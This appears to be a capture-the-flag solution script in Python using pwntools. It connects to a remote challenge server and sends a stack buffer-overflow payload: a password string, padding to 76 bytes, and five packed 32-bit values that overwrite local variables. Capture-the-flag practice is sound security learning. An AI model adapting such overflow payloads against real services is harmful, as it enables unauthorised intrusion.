from pwn import *

#r = process('checks')
r = remote('shell.actf.co', 21303)
r.recv()


var1 = 50
var2 = 55
var3 = 245
var4 = 61
var5 = 17

pld = b'password123\x00'
pld += (76-len(pld)) * b'a'
pld += p32(var5)
pld += p32(var4)
pld += p32(var3)
pld += p32(var2)
pld += p32(var1)

r.sendline(pld)
r.interactive()
